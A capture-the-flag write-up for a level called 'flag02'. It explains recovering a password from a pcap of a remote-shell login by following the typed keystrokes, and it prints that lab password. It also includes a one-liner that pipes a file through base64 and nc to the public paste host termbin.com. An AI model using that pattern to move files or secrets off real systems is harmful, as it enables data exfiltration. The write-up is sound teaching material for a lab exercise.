# flag02

We are given a pcap file with a login sequence attempt.

To retrieve the pcap file onto my machine, I used the [termbin](https://termbin.com) service:
```sh
cat pcap.pcap | base64 | nc termbin.com 9999
```

That gives us a URL which we can download and decode on our host:
```
wget https://termbin.com/<id> -O /tmp/pcap.b64
base64 -d /tmp/pcap.b64 > pcap.pcap
```

With the pcap file, we can use `wireshark` to look at the packets, and determine that it was a login sequence via a remote shell.

We can see the keyboard input of the user, typing keys, and deleting some (using the delete char `0x7F`). By following each keystroke, we end up with the password (`ft_waNDReL0L`).

We can now login as `flag02`.
